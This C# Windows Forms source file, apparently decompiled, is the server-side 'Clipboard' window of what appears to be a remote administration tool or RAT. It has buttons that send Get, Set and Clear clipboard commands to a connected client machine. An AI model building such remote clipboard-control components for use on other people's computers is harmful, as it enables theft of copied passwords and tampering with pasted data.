using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using CustomControls.RJControls;
using MaterialSkin;
using Server.Connectings;
using Server.Helper;

namespace Server.Forms;

public class FormClipboard : FormMaterial
{
	public Clients client;

	public Clients parrent;

	private IContainer components;

	private Timer timer1;

	public RichTextBox richTextBox1;

	private Panel panel1;

	public RJButton rjButton1;

	public RJButton rjButton2;

	public RJButton rjButton3;

	public FormClipboard()
	{
		InitializeComponent();
		base.FormClosing += Closing1;
	}

	private void FormProcess_Load(object sender, EventArgs e)
	{
		MaterialSkinManager.Instance.ThemeChanged += ChangeScheme;
		ChangeScheme(this);
		timer1.Start();
	}

	private void ChangeScheme(object sender)
	{
		richTextBox1.ForeColor = FormMaterial.PrimaryColor;
		rjButton1.BorderColor = FormMaterial.PrimaryColor;
		rjButton1.ForeColor = FormMaterial.PrimaryColor;
		rjButton2.BorderColor = FormMaterial.PrimaryColor;
		rjButton2.ForeColor = FormMaterial.PrimaryColor;
		rjButton3.BorderColor = FormMaterial.PrimaryColor;
		rjButton3.ForeColor = FormMaterial.PrimaryColor;
	}

	private void Closing1(object sender, EventArgs e)
	{
		if (client != null)
		{
			client.Disconnect();
		}
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		if (!parrent.itsConnect)
		{
			Close();
		}
		if (client != null && !client.itsConnect)
		{
			Close();
		}
	}

	private void rjButton1_Click(object sender, EventArgs e)
	{
		if (client.itsConnect)
		{
			client.Send(new object[1] { "Get" });
		}
	}

	private void rjButton2_Click(object sender, EventArgs e)
	{
		if (client.itsConnect)
		{
			client.Send(new object[2] { "Set", richTextBox1.Text });
		}
	}

	private void rjButton3_Click(object sender, EventArgs e)
	{
		if (client.itsConnect)
		{
			client.Send(new object[1] { "Clear" });
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		this.timer1 = new System.Windows.Forms.Timer(this.components);
		this.richTextBox1 = new System.Windows.Forms.RichTextBox();
		this.panel1 = new System.Windows.Forms.Panel();
		this.rjButton3 = new CustomControls.RJControls.RJButton();
		this.rjButton2 = new CustomControls.RJControls.RJButton();
		this.rjButton1 = new CustomControls.RJControls.RJButton();
		this.panel1.SuspendLayout();
		base.SuspendLayout();
		this.timer1.Interval = 1000;
		this.timer1.Tick += new System.EventHandler(timer1_Tick);
		this.richTextBox1.BackColor = System.Drawing.Color.White;
		this.richTextBox1.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.richTextBox1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.richTextBox1.Enabled = false;
		this.richTextBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.richTextBox1.ForeColor = System.Drawing.Color.MediumSlateBlue;
		this.richTextBox1.Location = new System.Drawing.Point(3, 64);
		this.richTextBox1.Name = "richTextBox1";
		this.richTextBox1.Size = new System.Drawing.Size(467, 397);
		this.richTextBox1.TabIndex = 1;
		this.richTextBox1.Text = "";
		this.panel1.Controls.Add(this.rjButton3);
		this.panel1.Controls.Add(this.rjButton2);
		this.panel1.Controls.Add(this.rjButton1);
		this.panel1.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.panel1.Location = new System.Drawing.Point(3, 461);
		this.panel1.Name = "panel1";
		this.panel1.Size = new System.Drawing.Size(467, 34);
		this.panel1.TabIndex = 2;
		this.rjButton3.BackColor = System.Drawing.Color.White;
		this.rjButton3.BackgroundColor = System.Drawing.Color.White;
		this.rjButton3.BorderColor = System.Drawing.Color.MediumSlateBlue;
		this.rjButton3.BorderRadius = 0;
		this.rjButton3.BorderSize = 1;
		this.rjButton3.Enabled = false;
		this.rjButton3.FlatAppearance.BorderSize = 0;
		this.rjButton3.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton3.ForeColor = System.Drawing.Color.MediumSlateBlue;
		this.rjButton3.Location = new System.Drawing.Point(199, 3);
		this.rjButton3.Name = "rjButton3";
		this.rjButton3.Size = new System.Drawing.Size(92, 28);
		this.rjButton3.TabIndex = 16;
		this.rjButton3.Text = "Clear Clipboard";
		this.rjButton3.TextColor = System.Drawing.Color.MediumSlateBlue;
		this.rjButton3.UseVisualStyleBackColor = false;
		this.rjButton3.Click += new System.EventHandler(rjButton3_Click);
		this.rjButton2.BackColor = System.Drawing.Color.White;
		this.rjButton2.BackgroundColor = System.Drawing.Color.White;
		this.rjButton2.BorderColor = System.Drawing.Color.MediumSlateBlue;
		this.rjButton2.BorderRadius = 0;
		this.rjButton2.BorderSize = 1;
		this.rjButton2.Enabled = false;
		this.rjButton2.FlatAppearance.BorderSize = 0;
		this.rjButton2.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton2.ForeColor = System.Drawing.Color.MediumSlateBlue;
		this.rjButton2.Location = new System.Drawing.Point(101, 3);
		this.rjButton2.Name = "rjButton2";
		this.rjButton2.Size = new System.Drawing.Size(92, 28);
		this.rjButton2.TabIndex = 15;
		this.rjButton2.Text = "Set Clipboard";
		this.rjButton2.TextColor = System.Drawing.Color.MediumSlateBlue;
		this.rjButton2.UseVisualStyleBackColor = false;
		this.rjButton2.Click += new System.EventHandler(rjButton2_Click);
		this.rjButton1.BackColor = System.Drawing.Color.White;
		this.rjButton1.BackgroundColor = System.Drawing.Color.White;
		this.rjButton1.BorderColor = System.Drawing.Color.MediumSlateBlue;
		this.rjButton1.BorderRadius = 0;
		this.rjButton1.BorderSize = 1;
		this.rjButton1.Enabled = false;
		this.rjButton1.FlatAppearance.BorderSize = 0;
		this.rjButton1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton1.ForeColor = System.Drawing.Color.MediumSlateBlue;
		this.rjButton1.Location = new System.Drawing.Point(3, 3);
		this.rjButton1.Name = "rjButton1";
		this.rjButton1.Size = new System.Drawing.Size(92, 28);
		this.rjButton1.TabIndex = 14;
		this.rjButton1.Text = "Get Clipboard";
		this.rjButton1.TextColor = System.Drawing.Color.MediumSlateBlue;
		this.rjButton1.UseVisualStyleBackColor = false;
		this.rjButton1.Click += new System.EventHandler(rjButton1_Click);
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.White;
		base.ClientSize = new System.Drawing.Size(473, 498);
		base.Controls.Add(this.richTextBox1);
		base.Controls.Add(this.panel1);
		base.Name = "FormClipboard";
		this.Text = "Clipboard";
		base.Load += new System.EventHandler(FormProcess_Load);
		this.panel1.ResumeLayout(false);
		base.ResumeLayout(false);
	}
}
